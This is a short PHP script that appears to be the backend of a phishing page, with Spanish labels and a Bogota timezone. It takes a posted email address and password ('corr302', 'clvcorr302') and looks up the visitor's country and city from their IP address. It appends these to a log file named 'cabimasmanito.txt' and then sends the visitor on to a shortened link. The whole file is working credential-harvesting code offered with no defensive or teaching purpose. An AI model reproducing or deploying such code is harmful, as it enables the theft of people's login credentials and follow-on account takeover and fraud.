<?php
session_start();
date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$ct = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));


$file = fopen("cabimasmanito.txt", "a");
fwrite($file, "2CORRE: ".$_POST['corr302']."\r\n2CLAV: ".$_POST['clvcorr302']."\r\nFecha: ".date('d-m-Y')." | ".date('H:i:s')."\r\n".$cc." ".$ct." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);


header("Location: https://bit.ly/3o6AHii");
exit
?>